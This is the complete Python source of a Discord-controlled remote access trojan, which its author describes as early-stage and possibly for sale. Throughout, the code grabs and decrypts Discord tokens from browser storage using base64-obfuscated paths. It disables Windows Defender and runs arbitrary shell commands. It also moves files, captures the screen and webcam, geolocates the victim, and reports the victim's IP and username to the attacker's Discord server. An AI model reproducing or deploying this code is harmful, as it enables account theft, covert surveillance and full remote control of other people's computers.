# Developed by nspe (discord) (lol ive been working on this for 3 weeks cause i was bored)
# This Discord Remote Access Trojan (RAT) is fairly harmless as it doesnt contain UAC-Bypasses or Dangerous Commands (other than token grabbing)
# This trojan is in very early development, but over time will (with rnough commitment from me) become a full fledged Discord RAT and possibly a 'cheap' but paid RAT similar to Seroxen.
# Please replace Token and Server Name Variables under the "Token & Vars Section"
# To add transparency and trust I will not make a builder, this means the entire src is below and must be manualy compiled by you. I suggest auto-py-to-exe as It's fairly simple to setup

#---------------------------------------#
#               IMPORTS                 #
#---------------------------------------#

import discord;
from discord.ext import commands
import tkinter as tk
import mss
import cv2
import os
import numpy as np
import webbrowser
import ctypes
import pyttsx3
import asyncio
import platform
import psutil
import socket
import getpass
import shutil
import subprocess
import requests
import aiohttp
import winshell
import shutil
import argparse
import sys
import re
import base64
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import win32crypt

#---------------------------------------#
#             TOKEN & VARS              #
#---------------------------------------#

TOKEN = 'BOT_TOKEN'
server_name = 'guild_name'


intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)
chatbox_window = None
chat_text_widget = None


#---------------------------------------#
#               COMMANDS                #
#---------------------------------------#

@bot.command()
async def token(ctx):
    try:
        done = grab()
        if done:
            for token in done:
                await ctx.send(token)
        else:
            await ctx.send("No tokens found.")
    except Exception as e:
        await ctx.send(f"An error occurred while grabbing tokens: {e}")

@bot.command()
async def disablewindef(ctx):
    try:
        command = "Set-MpPreference -DisableRealtimeMonitoring $true"
        subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-Command", command], shell=True, check=True)
        await ctx.send("Windows Defender has been disabled remotely.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error: Failed to disable Windows Defender. {e}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def admincheck(ctx):
    if ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("The bot has administrator permissions on this computer.")
    else:
        await ctx.send("The bot does not have administrator permissions on this computer.")

@bot.event
async def on_ready():
    guild = discord.utils.get(bot.guilds, name=server_name)
    if guild is None:
        print("Error: Bot couldn't find the specified guild.")
        return
    username = getpass.getuser()
    session_channel = await find_or_create_session_channel(guild, username)
    ip_address = await get_ip_address()
    await session_channel.send(f"New Session Created | IP: {ip_address} | User: {username}")

@bot.command()
async def procs(ctx):
    process_counts = get_process_names_with_counts()
    process_info = [f"{name} ({count})" if count > 1 else name for name, count in process_counts.items()]
    process_info_str = "\n".join(process_info)
    await ctx.send("Processes:\n" + process_info_str)

@bot.command()
async def screenshot(ctx):
    await take_screenshot()
    await send_screenshot(ctx)

@bot.command()
async def cd(ctx, directory: str):
    try:
        os.chdir(directory)
        await ctx.send(f"Changed directory to {os.getcwd()}")
    except Exception as e:
        await ctx.send(f"Failed to change directory: {e}")

@bot.command()
async def dir(ctx):
    try:
        files = os.listdir()
        if files:
            await ctx.send("Files and directories in current directory:")
            for file in files:
                await ctx.send(file)
        else:
            await ctx.send("The current directory is empty.")
    except Exception as e:
        await ctx.send(f"Failed to list directory contents: {e}")

@bot.command()
async def showdirs(ctx):
    try:
        directories = [d for d in os.listdir() if os.path.isdir(d)]
        if directories:
            await ctx.send("Available directories:")
            for directory in directories:
                await ctx.send(directory)
        else:
            await ctx.send("There are no directories in the current directory.")
    except Exception as e:
        await ctx.send(f"Failed to list directories: {e}")

@bot.command()
async def download(ctx, filename: str):
    try:
        if os.path.exists(filename):
            await ctx.send(file=discord.File(filename))
        else:
            await ctx.send(f"The file '{filename}' does not exist.")
    except Exception as e:
        await ctx.send(f"Failed to download file: {e}")

@bot.command()
async def upload(ctx):
    try:
        if len(ctx.message.attachments) == 0:
            await ctx.send("Please attach a file to upload.")
            return
        attachment = ctx.message.attachments[0]
        filename = attachment.filename
        await attachment.save(filename)
        await ctx.send(f"File '{filename}' has been uploaded.")
    except Exception as e:
        await ctx.send(f"Failed to upload file: {e}")

@bot.command()
async def website(ctx, url: str):
    await open_website(url)

@bot.command()
async def message(ctx, *, text: str):
    show_popup(text)

@bot.command()
async def cam(ctx):
    await take_camera_screenshot()
    await take_screenshot()
    await send_screenshot(ctx)

@bot.command()
async def audio(ctx, *, text: str):
    text_to_speech(text)

@bot.command()
async def info(ctx):
    system_info = await get_system_info()
    ip_address = await get_ip_address()
    connected_wifi = await get_connected_wifi()
    email = await get_email()
    hwid = await get_hwid()
    device_id = await get_device_id()
    is_virtual_machine = await check_virtual_machine()
    is_vpn_used = await detect_vpn_usage()

    info_message = f"```{system_info}\nIP Address: {ip_address}\nConnected WiFi: {connected_wifi}\nRegistered Owner (Email): {email}\nHWID: {hwid}\nDevice ID: {device_id}\nVirtual Machine: {is_virtual_machine}\nVPN in use: {is_vpn_used}```"

    await ctx.send(info_message)

@bot.command()
async def prockill(ctx, process_name: str):
    processes_to_kill = []
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            processes_to_kill.append(proc)
    if not processes_to_kill:
        await ctx.send(f"No process with the name '{process_name}' is running.")
    else:
        for proc in processes_to_kill:
            proc.kill()
        await ctx.send(f"All instances of '{process_name}' have been terminated.")

@bot.command()
async def procsearch(ctx, process_name: str):
    process_found = False
    for proc in psutil.process_iter(['name']):
        if proc.info['name'] == process_name:
            process_found = True
            break
    if process_found:
        await ctx.send(f"Process '{process_name}' is running.")
    else:
        await ctx.send(f"No process with the name '{process_name}' is running.")

@bot.command()
async def wallpaper(ctx):
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please attach an image to set as wallpaper.")
        return
    attachment = ctx.message.attachments[0]
    filename, extension = os.path.splitext(attachment.filename)
    valid_extensions = ['.jpg', '.jpeg', '.png', '.bmp']
    if extension.lower() not in valid_extensions:
        await ctx.send("Unsupported file type. Please attach an image with a valid extension.")
        return
    pictures_dir = os.path.join(os.path.expanduser('~'), 'Pictures')
    image_path = os.path.join(pictures_dir, attachment.filename)
    await attachment.save(image_path)
    if set_wallpaper(image_path):
        await ctx.send("Wallpaper has been updated.")
    else:
        await ctx.send("Can't change wallpaper. Most likely unsupported file type.")

@bot.command()
async def geolocate(ctx):
    location_info, geolocation_url = await get_geolocation()
    await ctx.send(location_info)
    if geolocation_url:
        await ctx.send(f"Geolocation URL: {geolocation_url}")

@bot.command()
async def shell(ctx, *, command: str):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command '{command}' returned non-zero exit status {e.returncode}:\n```\n{e.output}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def startproc(ctx, process_name: str):
    try:
        subprocess.Popen(process_name)
        await ctx.send(f"Process '{process_name}' has been started.")
    except Exception as e:
        await ctx.send(f"Error occurred while starting process '{process_name}': {e}")

@bot.command()
async def cmd(ctx, *, command: str):
    try:
        result = subprocess.check_output(['cmd', '/c', command], stderr=subprocess.STDOUT, universal_newlines=True)
        
        if len(result) > 2000:
            with open('cmd_output.txt', 'w', encoding='utf-8') as f:
                f.write(result)
            await ctx.send(file=discord.File('cmd_output.txt'))
        else:
            await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command '{command}' returned non-zero exit status {e.returncode}:\n```\n{e.output}\n```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


#---------------------------------------#
#              async defs               #
#---------------------------------------#

async def check_admin_perms(ctx):
    if ctx.author.guild_permissions.administrator:
        return True
    else:
        await ctx.send("You do not have administrator permissions. Cannot proceed with UAC bypass.")
        return False

async def uac_bypass_method(ctx, method_id, method_command, success_message):
    os.system(method_command)
    await ctx.send(success_message)

async def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.shot(output='screenshot.png')

async def send_screenshot(ctx):
    await ctx.send(file=discord.File("screenshot.png"))

async def take_camera_screenshot():
    os.system("start microsoft.windows.camera:")
    await asyncio.sleep(5)
    await take_screenshot()
    os.system("taskkill /im WindowsCamera.exe /f")

async def send_video(ctx, filename):
    await ctx.send(file=discord.File(filename))

async def open_website(url):
    webbrowser.open(url)

def show_popup(message):
    ctypes.windll.user32.MessageBoxW(0, message, "Message", 0)

def text_to_speech(text):
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()

async def get_system_info():
    try:
        registered_owner = await get_registered_owner()
    except Exception as e:
        print(f"Error occurred while retrieving system information: {e}")
        registered_owner = "Unknown"

    system_info = f"System: {platform.system()} {platform.release()}"
    cpu_info = f"CPU: {platform.processor()}"
    memory_info = psutil.virtual_memory()
    memory_total_gb = round(memory_info.total / (1024 ** 3), 2)
    memory_used_gb = round(memory_info.used / (1024 ** 3), 2)
    memory_percent = memory_info.percent
    memory_info_str = f"Memory: {memory_used_gb}GB used / {memory_total_gb}GB total ({memory_percent}%)"
    disk_info = psutil.disk_usage('/')
    disk_total_gb = round(disk_info.total / (1024 ** 3), 2)
    disk_used_gb = round(disk_info.used / (1024 ** 3), 2)
    disk_percent = disk_info.percent
    disk_info_str = f"Disk: {disk_used_gb}GB used / {disk_total_gb}GB total ({disk_percent}%)"
    return f"{system_info}\nRegistered Owner: {registered_owner}\n{cpu_info}\n{memory_info_str}\n{disk_info_str}"

async def get_registered_owner():
    try:
        result = subprocess.check_output('wmic computersystem get RegisteredOwner', shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while retrieving Registered Owner: {e}")
        return "Unknown"

async def get_ip_address():
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        return ip_address
    except Exception as e:
        return str(e)

async def get_connected_wifi():
    try:
        command_output = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces']).decode()
        lines = command_output.split('\n')
        for line in lines:
            if "SSID" in line:
                ssid = line.split(":")[1].strip()
                return ssid
        return "Not connected to WiFi"
    except Exception as e:
        return str(e)

async def get_email():
    try:
        command_output = subprocess.check_output('wmic computersystem get RegisteredOwner').decode().split('\n')[1].strip()
        return command_output
    except Exception as e:
        return str(e)

async def get_hwid():
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        return hwid
    except Exception as e:
        return str(e)

async def get_device_id():
    try:
        device_id = subprocess.check_output('wmic path win32_computersystemproduct get IdentifyingNumber').decode().split('\n')[1].strip()
        return device_id
    except Exception as e:
        return str(e)

async def check_virtual_machine():
    try:
        command_output = subprocess.check_output('wmic computersystem get Manufacturer').decode().split('\n')[1].strip()
        return "Yes" if "Microsoft Corporation" in command_output else "No"
    except Exception as e:
        return str(e)

async def detect_vpn_usage():
    try:
        ip_address = await get_public_ip()
        async with aiohttp.ClientSession() as session:
            async with session.get('https://api64.ipify.org') as response:
                public_ip = await response.text()
        return "Yes" if ip_address != public_ip else "No"
    except Exception as e:
        return str(e)

async def find_or_create_session_channel(guild, username):
    existing_channels = [c.name for c in guild.channels if isinstance(c, discord.TextChannel)]
    
    if username in existing_channels:
        session_channel = discord.utils.get(guild.channels, name=username)
        return session_channel
    
    try:
        session_channel = await guild.create_text_channel(username)
        return session_channel
    except discord.Forbidden:
        print("Error: Bot doesn't have permission to create channels in the guild.")
    except discord.HTTPException:
        print("Error: Failed to create the text channel.")

def find_next_session_name(existing_channels):
    username = getpass.getuser()
    session_num = 1
    while True:
        session_name = f"{username}"
        if session_name not in existing_channels:
            return session_name
        session_num += 1

def get_process_names_with_counts():
    process_counts = {}
    for proc in psutil.process_iter(['name']):
        process_name = proc.info['name']
        if process_name in process_counts:
            process_counts[process_name] += 1
        else:
            process_counts[process_name] = 1
    return process_counts

async def monitor_taskmgr(ctx):
    try:
        while True:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'Taskmgr.exe': 
                    proc.kill()
                    await ctx.send("User attempted to open Task Manager!")
            await asyncio.sleep(1)
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

async def get_public_ip():
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api64.ipify.org') as response:
            ip_address = await response.text()
    return ip_address

async def get_public_ip_from_vpn_check_api():
    async with aiohttp.ClientSession() as session:
        async with session.get('https://api64.ipify.org?format=json') as response:
            data = await response.json()
    return data.get('ip', '')

def set_wallpaper(image_path):
    print(f"Setting wallpaper with image: {image_path}")
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        return True
    except Exception as e:
        print(f"Error setting wallpaper: {e}")
        return False
    
async def get_geolocation():
    try:
        ip_address = await get_public_ip()
        vpn_check_ip = await get_public_ip_from_vpn_check_api()
        if vpn_check_ip != ip_address:
            return "VPN detected", None
        async with aiohttp.ClientSession() as session:
            async with session.get(f'http://ip-api.com/json/{ip_address}') as response:
                data = await response.json()
        if data['status'] == 'success':
            city = data['city']
            country = data['country']
            lat = data['lat']
            lon = data['lon']
            geolocation_url = f"https://www.geolocation.com/en_us?ip={ip_address}#ipresult"
            return f"City: {city}, Country: {country}, Latitude: {lat}, Longitude: {lon}", geolocation_url
        else:
            return "Failed to retrieve geolocation information", None
    except Exception as e:
        return f"Error: {e}", None

def grab():
    done = []
    appdata = base64.b64decode(b"XEFwcERhdGE=").decode("utf-8")
    user = os.path.expanduser("~")
    locallevel = base64.b64decode(b"XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==").decode("utf-8")
    paths = [
        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZA==").decode("utf-8"),
        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZHB0Yg==").decode("utf-8"),
        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZGNhbmFyeQ==").decode("utf-8"),
        base64.b64decode(b"XFJvYW1pbmdcZGlzY29yZGRldmVsb3BtZW50").decode("utf-8"),
        base64.b64decode(b"XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgU3RhYmxl").decode("utf-8"),
        base64.b64decode(b"XFJvYW1pbmdcT3BlcmEgU29mdHdhcmVcT3BlcmEgR1ggU3RhYmxl").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXEFtaWdvXFVzZXIgRGF0YQ==").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXFRvcmNoXFVzZXIgRGF0YQ==").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXEtvbWV0YVxVc2VyIERhdGE=").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHQ=").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXE9yYml0dW1cVXNlciBEYXRh").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXENlbnRCcm93c2VyXFVzZXIgRGF0YQ==").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXDdTdGFyXDdTdGFyXFVzZXIgRGF0YQ==").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXFNwdXRuaWtcU3B1dG5pa1xVc2VyIERhdGE=").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXFZpdmFsZGlcVXNlciBEYXRhXERlZmF1bHQ=").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXEdvb2dsZVxDaHJvbWUgU3hTXFVzZXIgRGF0YQ==").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXEVwaWMgUHJpdmFjeSBCcm93c2VyXFVzZXIgRGF0YQ==").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXHVDb3pNZWRpYVxVcmFuXFVzZXIgRGF0YVxEZWZhdWx0").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXE1pY3Jvc29mdFxFZGdlXFVzZXIgRGF0YVxEZWZhdWx0").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXE9wZXJhIFNvZnR3YXJlXE9wZXJhIE5lb25cVXNlciBEYXRhXERlZmF1bHQ=").decode("utf-8"),
        base64.b64decode(b"XExvY2FsXEJyYXZlU29mdHdhcmVcQnJhdmUtQnJvd3NlclxVc2VyIERhdGFcRGVmYXVsdA==").decode("utf-8")
    ]

    for path in paths:
        localdb = os.path.join(user, appdata, path, locallevel)
        localstate = os.path.join(user, appdata, path, "Local State")
        if os.path.exists(localdb) and os.path.exists(localstate):
            tokens = grab_tokens(localdb, localstate)
            for token in tokens:
                try:
                    headers = {"authorization": token}
                    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
                    done.append(f"{token}: {response.text}")
                except:
                    pass

    return done

def grab_tokens(leveldb_path, localstate_path):
    tokens = []
    basic_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    new_regex = re.compile(r"mfa\.[\w-]{84}")
    encrypted_regex = re.compile(r"(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)")

    for file in os.listdir(leveldb_path):
        if file.endswith(".ldb"):
            with open(os.path.join(leveldb_path, file), "r", encoding="utf-8") as f:
                contents = f.read()

            for match in basic_regex.finditer(contents):
                tokens.append(match.group())

            for match in new_regex.finditer(contents):
                tokens.append(match.group())

            for match in encrypted_regex.finditer(contents):
                encrypted_token = match.group(2)
                decrypted_token = decrypt_token(encrypted_token, localstate_path)
                tokens.append(decrypted_token)

    return tokens

def decrypt_token(encrypted_token, localstate_path):
    encrypted_token = base64.b64decode(encrypted_token.split(":")[1])
    encrypted_key = json.loads(open(localstate_path, "r", encoding="utf-8").read())["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key[5:])
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    cipher = AES.new(key, AES.MODE_GCM, encrypted_token[:12])
    decrypted_token = cipher.decrypt(encrypted_token[12:])[:-16].decode()
    return decrypted_token

bot.run(TOKEN)
